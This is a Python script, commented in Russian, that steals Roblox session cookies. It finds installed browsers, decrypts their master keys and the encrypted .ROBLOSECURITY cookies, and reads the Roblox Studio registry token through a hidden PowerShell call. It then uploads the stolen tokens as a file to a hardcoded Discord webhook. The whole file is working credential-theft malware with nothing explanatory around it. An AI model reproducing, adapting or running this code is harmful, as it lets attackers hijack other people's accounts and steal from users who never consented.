import os
import sys
import json
import base64
import shutil
import sqlite3
import subprocess
import urllib.request

# ====== ПРОВЕРЯЕМ БИБЛИОТЕКИ ТОЛЬКО ОДИН РАЗ ======
try:
    import requests
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    LIBRARIES_OK = True
except ImportError:
    LIBRARIES_OK = False
    print("[!] Библиотеки не найдены. Установка...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "pycryptodome", "pywin32", "--quiet"])
        import requests
        from win32crypt import CryptUnprotectData
        from Crypto.Cipher import AES
        LIBRARIES_OK = True
        print("[+] Библиотеки установлены.")
    except:
        print("[!] Не удалось установить библиотеки. Запусти скрипт с правами администратора.")
        input("Нажми Enter для выхода...")
        sys.exit()

# ====== WEBHOOK ======
webhook = "https://discordapp.com/api/webhooks/1526621588181745784/X_hFYhbbl7zceMe65Rg-SI61ZNJLKrn5KxAbqFlZoDN3JZphAtOO1drxGfOPyq0vg0YE"

def safe(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            print(f"[!] Ошибка в {func.__name__}: {e}")
            return None
    return wrapper

class CookieLogger:
    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')

    def __init__(self):
        print("[*] Поиск кук...")
        browsers = self.findBrowsers()
        cookies = []
        
        for browser in browsers:
            try:
                result = self.getCookie(browser[0], browser[1])
                if result:
                    cookies.append(result)
            except:
                pass

        # Roblox Studio
        try:
            output = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY",
                creationflags=0x08000000, shell=True
            ).decode().strip()
            if output:
                cookies.append(("Roblox App", [("None", output)]))
        except:
            pass
        
        # Формируем отчёт
        cookieDoc = ""
        for cookie in cookies:
            if not cookie or not cookie[1]:
                continue
            for profile, value in cookie[1]:
                cookieDoc += f"Browser: {cookie[0]}\nProfile: {profile}\nCookie: {value}\n\n"
        
        if not cookieDoc:
            cookieDoc = "No Cookies Found!"
        
        # Отправляем
        try:
            requests.post(webhook, files={"cookies.txt": cookieDoc})
            print("[✓] Отправлено в Discord")
        except Exception as e:
            print(f"[!] Ошибка отправки: {e}")
    
    @safe
    def findBrowsers(self):
        found = []
        for root in [self.appdata, self.localappdata]:
            if not root: continue
            for directory in os.listdir(root):
                path = os.path.join(root, directory)
                if not os.path.isdir(path): continue
                try:
                    for subroot, _, files in os.walk(path):
                        if "Local State" in files:
                            if "Default" in os.listdir(subroot):
                                found.append([subroot, True])
                            elif "Login Data" in os.listdir(subroot):
                                found.append([subroot, False])
                except:
                    pass
        return found

    @safe
    def getMasterKey(self, browserPath):
        with open(os.path.join(browserPath, "Local State"), "r", encoding="utf8") as f:
            localState = json.load(f)
        masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        return CryptUnprotectData(masterKey[5:], None, None, None, 0)[1]

    @safe
    def decryptCookie(self, cookie, masterKey):
        iv = cookie[3:15]
        encryptedValue = cookie[15:]
        cipher = AES.new(masterKey, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(encryptedValue)
        return decrypted[:-16].decode(errors="ignore")

    @safe
    def getCookie(self, browserPath, isProfiled):
        browserName = browserPath.split("\\")[-2] if browserPath.split("\\")[-1] == "User Data" else browserPath.split("\\")[-1]
        cookiesFound = []
        profiles = ["Default"]
        
        try:
            masterKey = self.getMasterKey(browserPath)
        except:
            return None

        if isProfiled:
            for d in os.listdir(browserPath):
                if d.startswith("Profile"):
                    profiles.append(d)
        
        for profile in profiles:
            profilePath = os.path.join(browserPath, profile)
            if not os.path.isdir(profilePath): continue
            
            cookiePath = os.path.join(profilePath, "Network", "Cookies") if "Network" in os.listdir(profilePath) else os.path.join(profilePath, "Cookies")
            if not os.path.exists(cookiePath): continue
            
            temp = "temp.db"
            shutil.copy2(cookiePath, temp)
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("SELECT encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")
            for row in cursor.fetchall():
                if row[0]:
                    decrypted = self.decryptCookie(row[0], masterKey)
                    if decrypted and decrypted.startswith("_|WARNING"):
                        cookiesFound.append((profile, decrypted))
            conn.close()
            os.remove(temp)
        
        return [browserName, cookiesFound] if cookiesFound else None

if __name__ == "__main__":
    CookieLogger()
    input("[*] Нажми Enter для выхода...")